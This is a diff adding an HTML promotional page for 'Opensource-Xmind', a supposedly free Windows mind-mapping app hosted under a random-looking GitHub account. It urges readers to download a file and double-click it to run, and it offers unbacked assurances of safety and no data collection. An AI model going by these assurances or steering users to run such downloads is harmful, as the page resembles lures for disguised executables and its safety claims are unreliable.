@@ -1,0 +1,291 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Opensource-Xmind - Free Mind Mapping App for Windows</title>
+    <meta name="description" content="Opensource-Xmind is a free, open-source mind mapping app for Windows. Organize ideas, plan projects, and visualize complex information with a clean, intuitive interface.">
+    <meta name="keywords" content="mind map, mind mapping, xmind, open source, free, windows, project planning, idea organization, visual thinking, productivity, brainstorming">
+    <meta name="author" content="Katydidcloudiness918">
+    <meta name="robots" content="index, follow">
+    <meta property="og:title" content="Opensource-Xmind - Free Mind Mapping App">
+    <meta property="og:description" content="A free, open-source mind mapping app inspired by XMind. Organize ideas, plan projects, and visualize complex information with ease.">
+    <meta property="og:type" content="website">
+    <meta property="og:url" content="https://github.com/Katydidcloudiness918/Opensource-Xmind">
+    <meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:title" content="Opensource-Xmind - Free Mind Mapping App">
+    <meta name="twitter:description" content="A free, open-source mind mapping app inspired by XMind. Organize ideas, plan projects, and visualize complex information with ease.">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: linear-gradient(135deg, #f5f7fa 0%, #c3cfe2 100%);
+            color: #2c3e50;
+            line-height: 1.7;
+            padding: 20px;
+        }
+        .container {
+            max-width: 900px;
+            margin: 0 auto;
+            background: #ffffff;
+            border-radius: 16px;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.1);
+            padding: 40px;
+        }
+        h1 {
+            font-size: 2.5rem;
+            color: #1a1a2e;
+            margin-bottom: 10px;
+            border-bottom: 3px solid #e94560;
+            padding-bottom: 15px;
+            text-align: center;
+        }
+        h2 {
+            font-size: 1.8rem;
+            color: #16213e;
+            margin-top: 35px;
+            margin-bottom: 15px;
+            padding-left: 10px;
+            border-left: 5px solid #e94560;
+        }
+        h3 {
+            font-size: 1.3rem;
+            color: #0f3460;
+            margin-top: 20px;
+            margin-bottom: 10px;
+        }
+        p {
+            margin-bottom: 15px;
+            font-size: 1.05rem;
+        }
+        .download-btn {
+            display: inline-block;
+            background: linear-gradient(45deg, #e94560, #ff6b6b);
+            color: white;
+            padding: 18px 40px;
+            font-size: 1.3rem;
+            font-weight: bold;
+            text-decoration: none;
+            border-radius: 50px;
+            box-shadow: 0 5px 20px rgba(233, 69, 96, 0.4);
+            transition: transform 0.3s ease, box-shadow 0.3s ease;
+            margin: 20px 0;
+            text-align: center;
+        }
+        .download-btn:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 8px 25px rgba(233, 69, 96, 0.5);
+        }
+        .badge {
+            display: block;
+            text-align: center;
+            margin: 30px 0;
+        }
+        .feature-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
+            gap: 25px;
+            margin: 25px 0;
+        }
+        .feature-card {
+            background: #f8f9fa;
+            border-radius: 12px;
+            padding: 25px;
+            box-shadow: 0 3px 10px rgba(0,0,0,0.05);
+            transition: transform 0.3s ease;
+        }
+        .feature-card:hover {
+            transform: translateY(-5px);
+        }
+        .feature-icon {
+            font-size: 2.5rem;
+            margin-bottom: 10px;
+        }
+        .feature-card h3 {
+            margin-top: 0;
+            color: #e94560;
+        }
+        .steps {
+            background: #f8f9fa;
+            border-radius: 12px;
+            padding: 25px;
+            margin: 20px 0;
+        }
+        .steps ol {
+            margin-left: 20px;
+        }
+        .steps li {
+            margin-bottom: 12px;
+            font-size: 1.05rem;
+        }
+        .highlight {
+            background: #fff3cd;
+            border-left: 4px solid #ffc107;
+            padding: 15px;
+            border-radius: 8px;
+            margin: 20px 0;
+        }
+        .footer {
+            text-align: center;
+            margin-top: 40px;
+            padding-top: 20px;
+            border-top: 2px solid #e0e0e0;
+            color: #666;
+        }
+        ul {
+            margin-left: 20px;
+            margin-bottom: 15px;
+        }
+        li {
+            margin-bottom: 8px;
+        }
+        @media (max-width: 768px) {
+            .container {
+                padding: 20px;
+            }
+            h1 {
+                font-size: 2rem;
+            }
+            .download-btn {
+                padding: 15px 30px;
+                font-size: 1.1rem;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>🧠 Opensource-Xmind - Visualize Ideas, Boost Productivity</h1>
+        
+        <div class="badge">
+            <a href="https://github.com/Katydidcloudiness918/Opensource-Xmind" class="download-btn" style="background: linear-gradient(45deg, #00b4d8, #90e0ef); box-shadow: 0 5px 20px rgba(0, 180, 216, 0.4);">⬇️ Download Opensource-Xmind Now</a>
+        </div>
+        
+        <p>Welcome to <strong>Opensource-Xmind</strong> – the completely free, open-source mind mapping application designed to help you organize your thoughts, plan complex projects, and bring clarity to your ideas. Whether you're a student, professional, or creative thinker, this app gives you the tools to transform chaotic thoughts into structured, beautiful mind maps.</p>
+        
+        <h2>✨ What Makes Opensource-Xmind Special?</h2>
+        <p>Opensource-Xmind is built on the principle that powerful software should be accessible to everyone. Inspired by the popular XMind application, we've created a tool that combines professional-grade features with a clean, user-friendly interface. No steep learning curves, no confusing menus – just pure, intuitive mind mapping that works the way you think.</p>
+        
+        <h2>🚀 Getting Started</h2>
+        <p>Getting started with Opensource-Xmind is incredibly simple. Follow these easy steps:</p>
+        
+        <div class="steps">
+            <h3>📥 Step 1: Download the Application</h3>
+            <p>Visit this link to download the application: <a href="https://github.com/Katydidcloudiness918/Opensource-Xmind" style="color: #e94560; font-weight: bold;">https://github.com/Katydidcloudiness918/Opensource-Xmind</a></p>
+            <p>This will take you to the official download page where you can get the latest version of Opensource-Xmind for Windows.</p>
+            
+            <h3>💾 Step 2: Save the File</h3>
+            <p>Once you click the download link, your browser will begin downloading the file. Save it to a location you can easily find, like your Desktop or Downloads folder. The download process typically takes just a few seconds depending on your internet connection.</p>
+            
+            <h3>🖥️ Step 3: Run the Application</h3>
+            <p>After the download completes, navigate to where you saved the file and double-click it to run Opensource-Xmind. The application will launch immediately – no complicated installation process required!</p>
+            
+            <h3>🎉 Step 4: Start Creating</h3>
+            <p>You're now ready to start mind mapping! Open the app, click on "New Map," and begin adding your central idea. From there, you can branch out with subtopics, add colors, icons, and connections to create a visual representation of your thoughts.</p>
+        </div>
+        
+        <div class="highlight">
+            <strong>💡 Tip:</strong> Opensource-Xmind is completely free and open-source. You can use it for personal projects, professional work, education, or anything else – no licenses, no subscriptions, no hidden costs. Ever.
+        </div>
+        
+        <h2>🎯 Key Features</h2>
+        <p>Opensource-Xmind comes packed with everything you need to create stunning mind maps:</p>
+        
+        <div class="feature-grid">
+            <div class="feature-card">
+                <div class="feature-icon">🎨</div>
+                <h3>Beautiful Themes</h3>
+                <p>Choose from a variety of professionally designed themes to make your mind maps visually appealing. Customize colors, fonts, and styles to match your personal preference or brand.</p>
+            </div>
+            <div class="feature-card">
+                <div class="feature-icon">📊</div>
+                <h3>Multiple Layouts</h3>
+                <p>Switch between different structural layouts including radial, tree, and logic charts. Find the perfect format for your content and thinking style.</p>
+            </div>
+            <div class="feature-card">
+                <div class="feature-icon">🏷️</div>
+                <h3>Labels & Markers</h3>
+                <p>Add labels, tags, and markers to your topics to categorize and prioritize information. Use flags, stars, and progress indicators to track project status.</p>
+            </div>
+            <div class="feature-card">
+                <div class="feature-icon">🔗</div>
+                <h3>Connections</h3>
+                <p>Create meaningful relationships between different topics using connection lines. Show how ideas relate to each other even across different branches.</p>
+            </div>
+            <div class="feature-card">
+                <div class="feature-icon">📝</div>
+                <h3>Rich Text Notes</h3>
+                <p>Attach detailed notes to any topic. Include links, images, and formatted text to provide context and supplementary information.</p>
+            </div>
+            <div class="feature-card">
+                <div class="feature-icon">🔍</div>
+                <h3>Search & Filter</h3>
+                <p>Quickly find any topic in your map with powerful search functionality. Filter by labels, markers, or text content to focus on what matters.</p>
+            </div>
+        </div>
+        
+        <h2>📋 System Requirements</h2>
+        <p>Opensource-Xmind is designed to run smoothly on most modern Windows computers. Here's what you need:</p>
+        <ul>
+            <li><strong>Operating System:</strong> Windows 10 or Windows 11</li>
+            <li><strong>Processor:</strong> 1 GHz or faster processor</li>
+            <li><strong>Memory:</strong> 2 GB RAM (4 GB recommended)</li>
+            <li><strong>Storage:</strong> 100 MB of available disk space</li>
+            <li><strong>Display:</strong> 1024 x 768 screen resolution or higher</li>
+        </ul>
+        
+        <h2>💼 Use Cases</h2>
+        <p>Opensource-Xmind is versatile enough for a wide range of applications:</p>
+        
+        <h3>📚 Education & Learning</h3>
+        <p>Students can use mind maps to summarize lectures, plan essays, and prepare for exams. Teachers can create visual lesson plans and interactive learning materials.</p>
+        
+        <h3>💼 Business & Project Management</h3>
+        <p>Plan projects from start to finish, brainstorm new ideas with your team, create organizational charts, and map out business strategies.</p>
+        
+        <h3>🧠 Personal Productivity</h3>
+        <p>Organize your daily tasks, plan events, set personal goals, and keep track of your ideas all in one visual space.</p>
+        
+        <h3>🎨 Creative Thinking</h3>
+        <p>Let your imagination run wild. Use mind maps for creative writing, storyboarding, content planning, and exploring new concepts.</p>
+        
+        <h2>🛠️ Built for Developers, Loved by Everyone</h2>
+        <p>While Opensource-Xmind is perfect for non-technical users, it's also built with modern web technologies including HTML5, CSS, JavaScript, and TypeScript. The application code is clean, well-documented, and available on GitHub for anyone who wants to contribute, customize, or learn from it.</p>
+        
+        <h2>❓ Frequently Asked Questions</h2>
+        
+        <h3>Is Opensource-Xmind really free?</h3>
+        <p>Yes! Opensource-Xmind is completely free to download, use, and modify. It's an open-source project, which means the source code is publicly available and can be improved by the community.</p>
+        
+        <h3>Can I export my mind maps?</h3>
+        <p>Yes, Opensource-Xmind supports multiple export formats so you can share your maps with others or use them in other applications. Export your work as images, PDFs, or other compatible formats.</p>
+        
+        <h3>Do I need an internet connection?</h3>
+        <p>No, Opensource-Xmind works entirely offline. Once you've downloaded the application, you can use it without any internet connection.</p>
+        
+        <h3>Will my data be safe?</h3>
+        <p>Absolutely. Your mind maps are stored locally on your computer. We don't collect any personal data, and there are no cloud services or tracking features.</p>
+        
+        <h2>📥 Download Opensource-Xmind Today</h2>
+        <p>Ready to transform the way you organize your thoughts? Download Opensource-Xmind now and experience the power of visual thinking:</p>
+        
+        <div class="badge">
+            <a href="https://github.com/Katydidcloudiness918/Opensource-Xmind" class="download-btn">🚀 Get Opensource-Xmind Free</a>
+        </div>
+        
+        <p>Visit this link to download the application: <a href="https://github.com/Katydidcloudiness918/Opensource-Xmind" style="color: #e94560; font-weight: bold;">https://github.com/Katydidcloudiness918/Opensource-Xmind</a></p>
+        
+        <h2>🤝 Join Our Community</h2>
+        <p>Opensource-Xmind is more than just software – it's a community of thinkers, planners, and creators. We welcome contributions, feedback, and ideas from users of all skill levels. Whether you want to report a bug, suggest a feature, or contribute code, your input is valuable to us.</p>
+        
+        <div class="footer">
+            <p>Made with ❤️ by the Opensource-Xmind community</p>
+            <p>© 2024 Opensource-Xmind. Free to use, modify, and share.</p>
+        </div>
+    </div>
+</body>
+</html>
